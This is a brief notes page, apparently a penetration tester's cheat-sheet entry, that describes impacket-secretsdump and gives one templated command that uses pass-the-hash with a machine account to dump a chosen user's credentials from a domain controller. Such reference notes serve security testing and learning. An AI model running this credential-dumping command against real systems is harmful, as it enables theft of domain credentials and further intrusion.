---
tags:
  - security
aliases:
  - impacket-secretsdump
---
A tool used to extract sensitive information such as user creds, security secrets, etc.
```
impacket-secretsdump '<domain>/<ComputerName$>@<hostname>' -hashes:<hashes> -just-dc-user <TargetUser> -dc-ip <dcIP>
```